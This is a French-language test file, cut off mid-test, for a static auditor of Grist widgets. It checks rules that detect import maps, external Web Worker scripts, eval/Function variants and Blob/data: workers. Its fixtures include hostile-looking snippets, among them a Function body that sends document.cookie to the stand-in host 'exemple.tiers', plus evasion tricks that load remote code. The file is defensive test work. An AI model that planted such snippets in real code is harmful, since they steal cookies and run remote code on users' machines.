import { test } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';
import { extraireImportMaps } from '../src/moteur/analyse-js.js';
import { analyserRessourcesExternes, analyserSortiesReseau, analyserInjections, analyserScriptDynamique, preparerCodeExecuteEnChaine, analyserAccesGrist, analyserStockage } from '../src/regles/c-securite.js';
import { analyserDependancesDistantes } from '../src/regles/e-dependances.js';
import { construireContexte } from '../src/contexte/inventaire.js';

/**
 * Demande d'Antoine (2026-09-28, relayée depuis le fil du prompt d'audit
 * LLM) : se mettre dans la peau de qui veut déployer un widget malveillant
 * et vérifier toutes les balises, pas seulement `<script src>`. Trou trouvé
 * en lisant `publipostageGrist` : ses dépendances (TipTap/ProseMirror) sont
 * déclarées par `<script type="importmap">` puis importées par spécificateur
 * nu — invisible à E-DEP-01 (qui ne lisait que `<script src>`) comme à
 * C-EXFIL-03 (même limite) et à toute règle basée sur l'AST JS (le JSON d'une
 * import map n'est jamais un `unitesJs`). Ajouté aussi : `<object>`/`<embed>`
 * (mineur, même traitement que `<img>`).
 *
 * Une piste explorée puis abandonnée après vérification par l'exécution (vraie
 * Chromium, voir la conversation) : une règle dédiée pour un
 * `Worker`/`SharedWorker` construit avec une URL externe. En réalité,
 * `new Worker(url-externe)` / `new SharedWorker(url-externe)` lève toujours
 * une `SecurityError` synchrone, y compris avec `type: 'module'` et des
 * en-têtes CORS permissifs — ce n'est pas un vecteur, c'est du code cassé.
 * Le vrai trou était ailleurs : `referencesSortantes()` (dans
 * `src/contexte/inventaire.js`) ne suivait jamais un
 * `new Worker('./local.js')`, donc le fichier du worker n'entrait jamais
 * dans la surface exécutée — son contenu (un `importScripts()` vers
 * l'extérieur, par exemple, qui lui s'exécute bien sans CORS) échappait
 * silencieusement à toutes les règles de l'axe C, quel que soit le domaine
 * visé. C'est ce trou-là qui est corrigé ci-dessous.
 */

function fichier(chemin, contenu, extra = {}) {
  return { chemin, contenu, lignes: contenu.split('\n'), ext: chemin.slice(chemin.lastIndexOf('.')), binaire: false, executee: true, vendorise: false, ...extra };
}

function depotTemporaire(fichiers) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gwaudit-worker-surface-'));
  for (const [rel, contenu] of Object.entries(fichiers)) {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, contenu);
  }
  return dir;
}

function importmap(objet) {
  return `<script type="importmap">\n${JSON.stringify(objet)}\n</script>`;
}

// ---------------------------------------------------------------------------
// extraireImportMaps (moteur partagé)
// ---------------------------------------------------------------------------

test('extraireImportMaps : lit imports et scopes, dédoublonne par URL cible', () => {
  const html = importmap({
    imports: { a: 'https://esm.sh/a@1.0.0', b: 'https://esm.sh/b@1.0.0' },
    scopes: { '/x/': { c: 'https://esm.sh/a@1.0.0' } }, // même URL que `a` : ne doit pas dupliquer
  });
  const entrees = extraireImportMaps(html);
  assert.equal(entrees.length, 2, 'deux URL cibles distinctes malgré 3 spécificateurs');
  assert.ok(entrees.some((e) => e.url === 'https://esm.sh/a@1.0.0'));
  assert.ok(entrees.some((e) => e.url === 'https://esm.sh/b@1.0.0'));
});

test('extraireImportMaps : marque sri=true seulement pour les URL couvertes par la clé integrity de premier niveau', () => {
  const html = importmap({
    imports: { a: 'https://esm.sh/a@1.0.0', b: 'https://esm.sh/b@1.0.0' },
    integrity: { 'https://esm.sh/a@1.0.0': 'sha384-xxx' },
  });
  const entrees = extraireImportMaps(html);
  assert.equal(entrees.find((e) => e.url.endsWith('/a@1.0.0')).sri, true);
  assert.equal(entrees.find((e) => e.url.endsWith('/b@1.0.0')).sri, false);
});

test('extraireImportMaps : JSON invalide est ignoré sans lever d\'exception', () => {
  const html = '<script type="importmap">{ ceci n\'est pas du JSON </script>';
  assert.doesNotThrow(() => extraireImportMaps(html));
  assert.deepEqual(extraireImportMaps(html), []);
});

// ---------------------------------------------------------------------------
// E-DEP-01 : import maps
// ---------------------------------------------------------------------------

test('E-DEP-01 : dépendance résolue par import map sans integrity, critique et bloquant', () => {
  const html = importmap({ imports: { 'prosemirror-model': 'https://esm.sh/prosemirror-model@1.25.11' } });
  const ctx = { fichiers: [fichier('index.html', html)] };
  const c = analyserDependancesDistantes(ctx).find((x) => x.regle === 'E-DEP-01');
  assert.ok(c, 'doit se déclencher : une import map n\'était vue par aucune règle avant ce correctif');
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test('E-DEP-01 : dépendance résolue par import map avec integrity, sévérité ramenée à majeur', () => {
  const html = importmap({
    imports: { 'prosemirror-model': 'https://esm.sh/prosemirror-model@1.25.11' },
    integrity: { 'https://esm.sh/prosemirror-model@1.25.11': 'sha384-xxx' },
  });
  const ctx = { fichiers: [fichier('index.html', html)] };
  const c = analyserDependancesDistantes(ctx).find((x) => x.regle === 'E-DEP-01');
  assert.ok(c);
  assert.equal(c.severite, 'majeur');
  assert.equal(c.bloquant, false);
});

test('E-DEP-01 : import map ne pointant que vers des chemins relatifs (vendoring fait dans les règles) ne déclenche rien', () => {
  const html = importmap({ imports: { 'mon-utilitaire': './vendor/mon-utilitaire.js' } });
  const ctx = { fichiers: [fichier('index.html', html)] };
  const constats = analyserDependancesDistantes(ctx).filter((x) => x.regle === 'E-DEP-01');
  assert.equal(constats.length, 0, 'un chemin local dans une import map est la mise en conformité recommandée, pas un défaut');
});

test('E-DEP-01 : import map avec du JSON invalide ne fait pas planter l\'analyse et ne produit aucun faux constat', () => {
  const html = '<script type="importmap">{ pas du json </script>';
  const ctx = { fichiers: [fichier('index.html', html)] };
  assert.doesNotThrow(() => analyserDependancesDistantes(ctx));
  assert.equal(analyserDependancesDistantes(ctx).filter((x) => x.regle === 'E-DEP-01').length, 0);
});

// ---------------------------------------------------------------------------
// C-EXFIL-03 : import maps, <object>, <embed>
// ---------------------------------------------------------------------------

test('C-EXFIL-03 : dépendance résolue par import map sans integrity, critique et bloquant (même règle qu\'un <script src>)', () => {
  const html = importmap({ imports: { 'prosemirror-model': 'https://esm.sh/prosemirror-model@1.25.11' } });
  const ctx = { fichiers: [fichier('index.html', html)] };
  const c = analyserRessourcesExternes(ctx).find((x) => x.regle === 'C-EXFIL-03' && /import map/i.test(x.titre));
  assert.ok(c);
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test('C-EXFIL-03 : import map avec integrity, sévérité ramenée à majeur', () => {
  const html = importmap({
    imports: { 'prosemirror-model': 'https://esm.sh/prosemirror-model@1.25.11' },
    integrity: { 'https://esm.sh/prosemirror-model@1.25.11': 'sha384-xxx' },
  });
  const ctx = { fichiers: [fichier('index.html', html)] };
  const c = analyserRessourcesExternes(ctx).find((x) => x.regle === 'C-EXFIL-03' && /import map/i.test(x.titre));
  assert.ok(c);
  assert.equal(c.severite, 'majeur');
  assert.equal(c.bloquant, false);
});

test('C-EXFIL-03 : import map ne pointant que vers des chemins relatifs ne déclenche rien', () => {
  const html = importmap({ imports: { 'mon-utilitaire': './vendor/mon-utilitaire.js' } });
  const ctx = { fichiers: [fichier('index.html', html)] };
  const constats = analyserRessourcesExternes(ctx).filter((x) => x.regle === 'C-EXFIL-03' && /import map/i.test(x.titre));
  assert.equal(constats.length, 0);
});

test('C-EXFIL-03 : import map pointant vers l\'API Grist elle-même ne déclenche rien (hors périmètre)', () => {
  const html = importmap({ imports: { grist: 'https://grist.numerique.gouv.fr/grist-plugin-api.js' } });
  const ctx = { fichiers: [fichier('index.html', html)] };
  const constats = analyserRessourcesExternes(ctx).filter((x) => x.regle === 'C-EXFIL-03' && /import map/i.test(x.titre));
  assert.equal(constats.length, 0);
});

test('C-EXFIL-03 : <object data> externe est signalé en mineur, comme <img>', () => {
  const html = '<object data="https://exemple.tiers/rapport.pdf"></object>';
  const ctx = { fichiers: [fichier('index.html', html)] };
  const c = analyserRessourcesExternes(ctx).find((x) => x.regle === 'C-EXFIL-03');
  assert.ok(c);
  assert.equal(c.severite, 'mineur');
});

test('C-EXFIL-03 : <embed src> externe est signalé en mineur, comme <img>', () => {
  const html = '<embed src="https://exemple.tiers/widget.svg">';
  const ctx = { fichiers: [fichier('index.html', html)] };
  const c = analyserRessourcesExternes(ctx).find((x) => x.regle === 'C-EXFIL-03');
  assert.ok(c);
  assert.equal(c.severite, 'mineur');
});

test('<object>/<embed> locaux ne déclenchent rien (comportement attendu, comme <img>)', () => {
  const html = '<object data="./rapport.pdf"></object><embed src="/widget.svg">';
  const ctx = { fichiers: [fichier('index.html', html)] };
  assert.equal(analyserRessourcesExternes(ctx).length, 0);
});

// ---------------------------------------------------------------------------
// Surface exécutée : new Worker('./local.js') / new SharedWorker(...)
// ---------------------------------------------------------------------------

test("un new Worker('./chemin/local.js') fait entrer le fichier du worker dans la surface exécutée", () => {
  const dir = depotTemporaire({
    'index.html': '<script src="app.js"></script>',
    'app.js': "const w = new Worker('./worker.js');",
    'worker.js': "importScripts('https://exemple.tiers/lib.js');",
  });
  try {
    const ctx = construireContexte(dir);
    assert.ok(ctx.surface.has('worker.js'), "avant ce correctif, worker.js n'entrait jamais dans la surface — son contenu était invisible à l'axe C");
    const worker = ctx.fichiers.find((f) => f.chemin === 'worker.js');
    assert.equal(worker.executee, true);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("un new SharedWorker('./chemin/local.js') fait aussi entrer le fichier dans la surface exécutée", () => {
  const dir = depotTemporaire({
    'index.html': '<script src="app.js"></script>',
    'app.js': "const w = new SharedWorker('./partage.js');",
    'partage.js': '',
  });
  try {
    const ctx = construireContexte(dir);
    assert.ok(ctx.surface.has('partage.js'));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('une fois dans la surface, le contenu du worker est audité comme le reste : importScripts() externe déclenche C-EXFIL-01', () => {
  const dir = depotTemporaire({
    'index.html': '<script src="app.js"></script>',
    'app.js': "const w = new Worker('./worker.js');",
    'worker.js': "importScripts('https://exemple.tiers/lib.js');",
  });
  try {
    const ctx = construireContexte(dir);
    const constats = analyserSortiesReseau(ctx);
    const c = constats.find((x) => x.regle === 'C-EXFIL-01' && x.fichier === 'worker.js');
    assert.ok(c, "importScripts() vers un domaine externe, dans un fichier de worker atteint uniquement via new Worker(), doit maintenant être vu");
    assert.equal(c.severite, 'critique');
    assert.equal(c.bloquant, true);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("new Worker(url http(s) absolue) ne fait entrer aucun fichier dans la surface (impossible à suivre, et sans objet : voir plus haut)", () => {
  const dir = depotTemporaire({
    'index.html': '<script src="app.js"></script>',
    'app.js': "const w = new Worker('https://exemple.tiers/worker.js');",
  });
  try {
    const ctx = construireContexte(dir);
    assert.equal(ctx.surface.size, 2, 'seuls index.html et app.js : aucune tentative de résoudre une URL absolue comme fichier local');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Angles morts trouvés par la coordination (2026-09-28, vérifiés par
// l'exécution de construireContexte() sur de vraies fixtures) : un new
// Worker écrit dans un <script> inline HTML, la forme que produisent les
// empaqueteurs (new URL(..., import.meta.url)), un gabarit statique, et un
// importScripts() local chaîné depuis un worker déjà dans la surface.
// ---------------------------------------------------------------------------

test("un new Worker('./local.js') écrit dans un <script> INLINE (pas un fichier .js séparé) fait aussi entrer le worker dans la surface", () => {
  const dir = depotTemporaire({
    'index.html': "<script>const w = new Worker('./worker.js');</script>",
    'worker.js': '',
  });
  try {
    const ctx = construireContexte(dir);
    assert.ok(ctx.surface.has('worker.js'));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("new Worker(new URL('./worker.js', import.meta.url)) — forme produite par les empaqueteurs (Vite, Webpack 5) — est suivie", () => {
  const dir = depotTemporaire({
    'index.html': '<script type="module" src="app.js"></script>',
    'app.js': "const w = new Worker(new URL('./worker.js', import.meta.url));",
    'worker.js': '',
  });
  try {
    const ctx = construireContexte(dir);
    assert.ok(ctx.surface.has('worker.js'));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("un gabarit statique sans interpolation (\\`./worker.js\\`) est suivi comme un littéral", () => {
  const dir = depotTemporaire({
    'index.html': '<script src="app.js"></script>',
    'app.js': 'const w = new Worker(`./worker.js`);',
    'worker.js': '',
  });
  try {
    const ctx = construireContexte(dir);
    assert.ok(ctx.surface.has('worker.js'));
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('un gabarit AVEC interpolation reste traité comme une source calculée (pas de faux chemin résolu, pas de plantage)', () => {
  const dir = depotTemporaire({
    'index.html': '<script src="app.js"></script>',
    'app.js': 'const nom = "worker"; const w = new Worker(`./${nom}.js`);',
  });
  try {
    assert.doesNotThrow(() => construireContexte(dir));
    const ctx = construireContexte(dir);
    assert.equal(ctx.surface.size, 2, 'seuls index.html et app.js : une source interpolée ne doit résoudre aucun chemin inventé');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("un importScripts('./sous-script.js') À L'INTÉRIEUR d'un worker chaîne ce sous-script dans la surface", () => {
  const dir = depotTemporaire({
    'index.html': '<script src="app.js"></script>',
    'app.js': "const w = new Worker('./worker.js');",
    'worker.js': "importScripts('./sous-script.js');",
    'sous-script.js': "importScripts('https://exemple.tiers/lib.js');",
  });
  try {
    const ctx = construireContexte(dir);
    assert.ok(ctx.surface.has('worker.js'));
    assert.ok(ctx.surface.has('sous-script.js'), "avant ce correctif, importScripts() n'était jamais suivi pour la surface : sous-script.js restait invisible même une fois worker.js inclus");
    const constats = analyserSortiesReseau(ctx);
    assert.ok(constats.some((c) => c.regle === 'C-EXFIL-01' && c.fichier === 'sous-script.js'), "l'appel externe dans sous-script.js doit être vu une fois ce fichier dans la surface");
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// C-EXFIL-01/02 : importScripts() avec plusieurs arguments
// ---------------------------------------------------------------------------

test("importScripts('./local.js', 'https://exemple.tiers/lib.js') : l'argument externe est vu même en second, sans être masqué par le premier (dédoublonnage par argument, pas par ligne)", () => {
  const ctx = { fichiers: [fichier('app.js', "importScripts('./local.js', 'https://exemple.tiers/lib.js');")] };
  const constats = analyserSortiesReseau(ctx).filter((c) => c.regle === 'C-EXFIL-01' || c.regle === 'C-EXFIL-02');
  assert.equal(constats.length, 1, "un seul argument est externe ('./local.js' est local, donc écarté)");
  assert.ok(constats[0].constat.includes('exemple.tiers'));
});

test('importScripts() avec DEUX arguments externes distincts sur le même appel produit deux constats, pas un seul (régression du dédoublonnage par ligne)', () => {
  const ctx = { fichiers: [fichier('app.js', "importScripts('https://exemple-un.tiers/a.js', 'https://exemple-deux.tiers/b.js');")] };
  const constats = analyserSortiesReseau(ctx).filter((c) => c.regle === 'C-EXFIL-01');
  assert.equal(constats.length, 2, "avant ce correctif, la clé de dédoublonnage (fichier:ligne:canal) aurait fait disparaître le second argument, identique au premier sur ces trois critères");
  assert.ok(constats.some((c) => c.constat.includes('exemple-un.tiers')));
  assert.ok(constats.some((c) => c.constat.includes('exemple-deux.tiers')));
});

// ---------------------------------------------------------------------------
// eval()/Function()/setTimeout()/setInterval()/new Worker(code en chaîne) :
// détectés et matérialisés par `preparerCodeExecuteEnChaine`, PAS par
// `analyserInjections` (voir sa doc, et le commit qui a introduit cette
// réécriture) — la construction et le contenu imbriqué sortent tous les deux
// de ce seul appel ; un risque découvert dans le contenu par une AUTRE règle
// (fetch/importScripts vu par analyserSortiesReseau, accès Grist vu par
// analyserAccesGrist, stockage vu par analyserStockage…) demande un second
// appel, APRÈS, sur le même `ctx` — c'est le fichier synthétique ajouté à
// `ctx.fichiers` qui porte cette information d'une règle à l'autre.
// ---------------------------------------------------------------------------

test("C-XSS-07 : new Worker(URL.createObjectURL(new Blob([littéral]))) est un littéral entièrement lisible — audité comme le reste du dépôt, pas critique pour sa seule construction", () => {
  const ctx = { fichiers: [fichier('app.js', "const w = new Worker(URL.createObjectURL(new Blob([\"importScripts('https://exemple.tiers/x.js')\"])));")] };
  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(construction, "le code du worker est lisible : la construction elle-même n'est plus qu'un rappel de lisibilité");
  assert.equal(construction.severite, 'mineur');
  assert.equal(construction.bloquant, false);
  const importScriptsExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01' && x.fichier.includes('code littéral'));
  assert.ok(importScriptsExterne, "le VRAI risque (importScripts vers un domaine externe) doit être vu, dans le fichier synthétique, par l'analyse imbriquée, pas seulement la construction");
  assert.equal(importScriptsExterne.severite, 'critique');
  assert.equal(importScriptsExterne.bloquant, true);
});

test("C-XSS-07 : new SharedWorker(URL.createObjectURL(new Blob([littéral]))) est également détecté", () => {
  const ctx = { fichiers: [fichier('app.js', "const w = new SharedWorker(URL.createObjectURL(new Blob(['postMessage(1)'])));")] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c);
});

test("C-XSS-07 : new Worker(url data: littérale) est décodée et auditée — le VRAI risque (importScripts externe) ressort en critique, pas la construction", () => {
  const ctx = { fichiers: [fichier('app.js', "const w = new Worker('data:text/javascript,importScripts(%27https://exemple.tiers/x.js%27)');")] };
  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(construction);
  assert.equal(construction.severite, 'mineur');
  assert.equal(construction.bloquant, false);
  const importScriptsExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01' && x.fichier.includes('code littéral'));
  assert.ok(importScriptsExterne, "le data: doit être décodé (URI-encodage) puis analysé comme du code");
  assert.equal(importScriptsExterne.severite, 'critique');
  assert.equal(importScriptsExterne.bloquant, true);
});

test("C-XSS-07 : new Worker(new URL('data:text/javascript,...')) — data: enveloppé dans new URL() — est lui aussi décodé et audité, pas rejeté comme « pas entièrement littéral »", () => {
  // Trou relevé par la coordination le 2026-09-28 (deuxième vérification par
  // exécution, Chromium 141) : `extraireCodeLitteralWorker` ne suivait pas
  // `new URL(...)` autour d'un data:, contrairement à `classifierSourceWorker`
  // qui décide déjà la catégorie sur ce cas — le contenu, pourtant entièrement
  // littéral, retombait à tort en critique « pas entièrement littéral ».
  const ctx = { fichiers: [fichier('app.js', "const w = new Worker(new URL('data:text/javascript,importScripts(\"https://exemple.tiers/x.js\")'));")] };
  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(construction);
  assert.equal(construction.severite, 'mineur', "le contenu est entièrement littéral : ce n'est plus qu'un rappel de lisibilité");
  assert.equal(construction.bloquant, false);
  const importScriptsExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01' && x.fichier.includes('code littéral'));
  assert.ok(importScriptsExterne, "le VRAI risque, une fois le data: décodé à travers le new URL(...), doit ressortir");
  assert.equal(importScriptsExterne.severite, 'critique');
});

test("C-XSS-07 : un Blob construit depuis une VARIABLE (contenu reçu du réseau, ou autre) est signalé quand même — accuser la construction, pas le contenu (la coordination a montré que 'seulement si littéral' se contournait en une ligne)", () => {
  const ctx = { fichiers: [fichier('app.js', [
    "const texte = await (await fetch('https://exemple.tiers/lib.js')).text();",
    'const w = new Worker(URL.createObjectURL(new Blob([texte])));',
  ].join('\n'))] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c, "récupérer un contenu (déjà vu par C-EXFIL-01/02 sur le fetch) et l'exécuter comme du code sont deux faits distincts, pas un double comptage du même fait");
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test("C-XSS-07 : new Worker('./local.js') normal (chemin de fichier, pas data:/Blob) ne déclenche rien", () => {
  const ctx = { fichiers: [fichier('app.js', "const w = new Worker('./local.js');")] };
  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
});

test("C-XSS-07 : new Worker(url http(s) absolue littérale) ne déclenche rien (code cassé, jamais exécuté — voir be1b5f4)", () => {
  const ctx = { fichiers: [fichier('app.js', "const w = new Worker('https://exemple.tiers/worker.js');")] };
  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
});

test("C-XSS-07 : new Worker(new URL('./local.js', import.meta.url)) (forme des empaqueteurs) ne déclenche toujours rien (pas de régression)", () => {
  const ctx = { fichiers: [fichier('app.js', "const w = new Worker(new URL('./local.js', import.meta.url));")] };
  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
});

test('C-XSS-07 : un gabarit statique dans le tableau du Blob compte aussi comme littéral', () => {
  const ctx = { fichiers: [fichier('app.js', 'const w = new Worker(URL.createObjectURL(new Blob([`postMessage(1);`])));')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c);
});

test("C-XSS-07 : une URL data: obtenue par CONCATÉNATION ('data:text/javascript,' + code) est aussi critique et bloquante", () => {
  const ctx = { fichiers: [fichier('app.js', "const code = \"importScripts('https://exemple.tiers/x.js')\"; const w = new Worker('data:text/javascript,' + code);")] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c, "la tête littérale 'data:text/javascript,' suffit à reconnaître le motif, même si le reste est une variable");
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test("C-XSS-07 : une source non résolue (variable simple, gabarit interpolé) produit un constat majeur, à vérifier — plutôt que le silence d'avant", () => {
  const ctx = { fichiers: [fichier('app.js', 'const w = new Worker(sourceCalculeeAilleurs);')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c, "une variable peut cacher une URL blob: assemblée dans une instruction précédente, invisible à l'analyse d'une seule expression");
  assert.equal(c.severite, 'majeur');
  assert.equal(c.bloquant, false);
  assert.equal(c.confiance, 'a_verifier');
});

test('C-XSS-07 : un gabarit AVEC interpolation comme source de Worker est aussi traité comme non résolu (pas de silence, pas de plantage)', () => {
  const ctx = { fichiers: [fichier('app.js', 'const nom = "w"; const w = new Worker(`./${nom}.js`);')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c);
  assert.equal(c.severite, 'majeur');
});

test("C-XSS-07 : new Worker(url) où url = URL.createObjectURL(blob) est assigné dans une instruction PRÉCÉDENTE reste, honnêtement, 'non résolue' (pas de suivi inter-instructions) — mais n'est plus silencieux", () => {
  const ctx = { fichiers: [fichier('app.js', [
    "const blob = new Blob([\"importScripts('https://exemple.tiers/x.js')\"]);",
    'const url = URL.createObjectURL(blob);',
    'const w = new Worker(url);',
  ].join('\n'))] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c, "l'analyse ne remonte pas au-delà de l'expression donnée à new Worker() : c'est le cas honnêtement documenté comme 'non résolue', pas un constat 'certain'");
  assert.equal(c.severite, 'majeur');
});

test("C-XSS-07 : new window.Worker(...) (alias global) est détecté comme new Worker(...), et son contenu littéral tout autant audité", () => {
  const ctx = { fichiers: [fichier('app.js', "const w = new window.Worker(URL.createObjectURL(new Blob([\"importScripts('https://exemple.tiers/x.js')\"])));")] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c);
  assert.equal(c.severite, 'mineur');
  assert.equal(c.titre.startsWith('Worker '), true, "l'alias ne doit pas fuiter dans le texte affiché (plus de \"undefined construit depuis...\")");
  const importScriptsExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01' && x.fichier.includes('code littéral'));
  assert.ok(importScriptsExterne, "l'alias ne doit pas empêcher l'analyse du contenu littéral non plus");
  assert.equal(importScriptsExterne.severite, 'critique');
});

test("C-XSS-07 : self.URL.createObjectURL(...) (alias global sur URL) est traité comme URL.createObjectURL(...)", () => {
  const ctx = { fichiers: [fichier('app.js', "const w = new Worker(self.URL.createObjectURL(monBlob));")] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c, "createObjectURL reste createObjectURL derrière un alias self./window./globalThis.");
  assert.equal(c.severite, 'critique');
});

test("C-XSS-07 : createObjectURL(...) est critique quel que soit son propre argument (Blob déjà construit ailleurs, tableau depuis une variable, File...)", () => {
  const ctx = { fichiers: [fichier('app.js', [
    "const morceaux = ['importScripts(\"https://exemple.tiers/x.js\")'];",
    'const blob = new Blob(morceaux);',
    'const w = new Worker(URL.createObjectURL(blob));',
  ].join('\n'))] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-07');
  assert.ok(c, "tout appel à createObjectURL passé à un Worker est un code opaque à l'analyse statique, quel que soit ce qui lui est passé");
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test("C-XSS-07 : new Worker(new URL('./local.js', location.href)) (base autre que import.meta.url) ne déclenche rien", () => {
  const ctx = { fichiers: [fichier('app.js', "const w = new Worker(new URL('./local.js', location.href));")] };
  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0, "le schéma de x ('./local.js') décide, quelle que soit la base");
});

test("surface exécutée : new Worker(new URL('./w.js', location.href)) (base autre que import.meta.url) fait quand même entrer w.js dans la surface", () => {
  const dir = depotTemporaire({
    'index.html': '<!doctype html><script src="app.js"></script>',
    'app.js': "const w = new Worker(new URL('./w.js', location.href));",
    'w.js': "importScripts('https://exemple.tiers/lib.js');",
  });
  try {
    const ctx = construireContexte(dir);
    const w = ctx.fichiers.find((f) => f.chemin === 'w.js');
    assert.ok(w?.executee, "w.js doit être dans la surface même si la base n'est pas import.meta.url — c'est le chemin local qui compte, pas la base");
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("C-XSS-03 : Function(...) sans new est reconnu comme new Function(...), et son contenu littéral audité (pas critique pour la seule construction)", () => {
  const ctx = { fichiers: [fichier('app.js', "const f = Function('return document.cookie');")] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
  assert.ok(c, 'Function(str) sans new compile aussi une chaîne en fonction exécutable');
  assert.equal(c.severite, 'mineur', "un simple retour de document.cookie, sans l'envoyer nulle part, n'a pas la propriété de sécurité qui justifie critique+bloquant (voir Function(\"return this\") dans lodash, widget-exemple)");
  assert.equal(c.bloquant, false);
});

test("C-XSS-03 : Function(...) sans new reste critique quand son corps littéral exfiltre réellement (fetch vers un domaine externe)", () => {
  const ctx = { fichiers: [fichier('app.js', 'const f = Function(\'fetch("https://exemple.tiers/vole?c="+document.cookie)\');')] };
  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
  assert.equal(construction.severite, 'mineur', "la construction elle-même n'est qu'un rappel de lisibilité : le risque réel doit être ailleurs");
  const fetchExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-02' && x.fichier.includes('code littéral'));
  assert.ok(fetchExterne, "le fetch() imbriqué dans le corps littéral doit être vu par l'analyse imbriquée (C-EXFIL-02 : destination calculée par concaténation)");
});

test("C-XSS-03 : Function(...) sans new reste critique et bloquant quand son argument est calculé (rien à auditer)", () => {
  const ctx = { fichiers: [fichier('app.js', 'const f = Function(corpsCalcule);')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('sans new'));
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test("C-XSS-03 : eval indirect (0, eval)(...) est reconnu comme eval(...), et son contenu littéral audité — un eval imbriqué y redevient critique", () => {
  const ctx = { fichiers: [fichier('app.js', "(0, eval)('eval(codeCalcule)');")] };
  // Un eval() imbriqué dans un eval() littéral est du ressort du MÊME appel :
  // `preparerCodeExecuteEnChaine` itère sa propre frontière de fichiers
  // matérialisés jusqu'à épuisement (ou la profondeur maximale).
  const constats = preparerCodeExecuteEnChaine(ctx);
  const construction = constats.find((x) => x.regle === 'C-XSS-03' && x.titre.includes('indirect'));
  assert.ok(construction, "l'eval indirect via l'opérateur virgule est un contournement courant des recherches sur eval(");
  assert.equal(construction.severite, 'mineur');
  assert.equal(construction.bloquant, false);
  const evalImbrique = constats.find((x) => x.regle === 'C-XSS-03' && x.fichier.includes('code littéral') && x.titre === 'Exécution de code arbitraire via eval()');
  assert.ok(evalImbrique, "l'eval() imbriqué dans le littéral, lui-même à argument calculé, doit redevenir critique");
  assert.equal(evalImbrique.severite, 'critique');
  assert.equal(evalImbrique.bloquant, true);
});

test("C-XSS-03 : eval indirect (0, eval)(...) reste critique et bloquant quand son argument est calculé", () => {
  const ctx = { fichiers: [fichier('app.js', "(0, eval)(codeCalcule);")] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('indirect'));
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

// ---------------------------------------------------------------------------
// setTimeout/setInterval — deuxième relecture de la coordination (exécution
// réelle, Chromium 141) : Chromium compile en code TOUT argument qui produit
// une chaîne, pas seulement les trois formes syntaxiques reconnues jusqu'ici
// (atob(...), un identifiant qui ne résout ni fonction ni littéral). Une
// fonction — fléchée, ou un identifiant qui en résout une dans le fichier —
// n'est jamais signalée : le motif `setTimeout(callback, delai)` doit rester
// silencieux, y compris dans du code embarqué comme lodash.
// ---------------------------------------------------------------------------

test('C-XSS-04 : setTimeout(fonction fléchée, délai) ne déclenche rien', () => {
